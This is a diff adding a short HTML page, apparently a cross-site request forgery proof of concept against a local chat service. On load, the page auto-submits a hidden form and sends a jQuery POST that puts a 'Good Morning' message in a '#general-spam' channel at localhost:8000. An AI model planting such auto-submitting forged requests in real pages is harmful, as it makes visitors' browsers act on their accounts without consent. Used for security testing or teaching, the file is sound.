@@ -1,0 +1,8 @@
+<html><body>
+
+  <form name="csrf_form" action="localhost:8000/post" method="POST">
+  <script language="javascript" type="text/javascript"> $.post("localhost:8000/post", {"channel": "#general-spam", "message": "Good Morning",}).done(function(status) {status = JSON.parse(status);});</script>
+  </form>
+
+  <script type="text/javascript">document.csrf_form.submit();</script>
+</body></html>
